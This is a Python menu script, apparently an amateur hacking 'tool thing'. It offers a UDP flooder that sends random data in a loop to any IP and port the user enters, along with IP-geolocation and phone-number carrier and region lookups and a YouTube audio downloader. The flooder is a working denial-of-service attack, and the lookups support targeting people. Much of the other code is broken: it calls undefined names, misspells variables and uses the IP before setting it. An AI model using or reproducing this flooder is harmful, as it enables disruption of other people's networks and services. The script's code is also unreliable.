import socket, random, time, os, subprocess, json, requests
from sys import argv
from pystyle import *
from colorama import *
from numpy import number


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system('cls')

start = """

Welcome to Decryption / Critical 
tool thing i dont fucking know
i know the ip look yo dosen't work
i got lazy at the end if you want it to
Work fix it yourself that gose with anything
i may try to fix it and add some other stuff
if i get around to doing or something like that
just  Press Enter 

"""

Anime.Fade(Center.Center(start), Colors.black_to_green, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.RED}

╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮
╰╮╭╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮                                                                             
╱┃┃┃┣━━┳━━┳━┳╮╱╭┳━┻╮╭╋┳━━┳━━╮              Auother
╱┃┃┃┃┃━┫╭━┫╭┫┃╱┃┃╭╮┃┃┣┫╭╮┃╭╮┃
╭╯╰╯┃┃━┫╰━┫┃┃╰━╯┃╰╯┃╰┫┃╰╯┃┃┃┃       Decryption / Critical
╰━━━┻━━┻━━┻╯╰━╮╭┫╭━┻━┻┻━━┻╯╰╯                                                                                
╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃┃┃
╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╰╯

""")

time.sleep(1)


while True:
    Write.Print("\nPress 1 To Enter IP to DoS", Colors.red_to_purple)
    Write.Print("\nPress 2 To look IP up", Colors.red_to_purple)
    Write.Print("\nPress 3 To look up Phone Number", Colors.red_to_purple)
    Write.Print("\nPress 4 To use mp3 YT Downloader", Colors.red_to_purple)
    Write.Print("\nPress 5 To close Tool Thing", Colors.red_to_purple, end="")
    pickone = input("\n")

    if pickone == "1":
        os.system("cls")
        ip = input(Fore.BLUE + "Enter IP Here\n" + Style.RESET_ALL)
        port = int(input(Fore.LIGHTBLUE_EX + "Enter Port Here\n" + Style.RESET_ALL))
        sleep = float(input(Fore.CYAN + "Enter dely time\n" + Style.RESET_ALL))

        s.connect((ip, port))
 
        for i in range(1, 100**1000):
            s.send(random._urandom(10)*1000)
            print(f"Send: {i}", end='\r')
            time.sleep(sleep)


    if pickone == "2":
        os.system("cls")
        with requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query,") as result:
            info = result.json()
            print(json.dumps(info, indent=4))
        ip = input(Fore.BLUE + "Enter IP To look up\n" + Style.RESET_ALL)
        lookup(ip)
        question = input("Look up again y/n: ")
        if question.lower() == "n":
            break

    if pickone == "3":
        os.system("cls")
        number = input(Fore.BLUE + "Enter Phone Number Add Plus Code\n" + Style.RESET_ALL)
        phone = phonenumbers.parse(number)
        time = timezone.time_zone_fornumber(phone)
        car = carrier.name_for_number(phone, "en")
        reg = geocoder.description_for_number(phone, "en")

        print(phnoe)
        print(time)
        print(car)
        print(reg)

    if pickone == "4":
        os.system("cls")
        yt = input(Fore.BLUE + "Enter URL to Downlaod\n" + Style.RESET_ALL)
        
        video = yt.streams.filter(only_audio=True).first()

        destination = "Audio/"

        out_file = video.download(output_path=destination)

        base, ext = os.path.splitext(out_file)
        new_file = base + '.mp3'
        os.rename(out_file, new_file)

        print(yt.title + Fore.LIGHTBLUE_EX + " successfully downlaoded." + Style.RESET_ALL)
        break

    if pickone == "5":
        os.system("cls")
        Write.Print("\nExiting Tool Thing Now", Colors.red_to_purple)
        break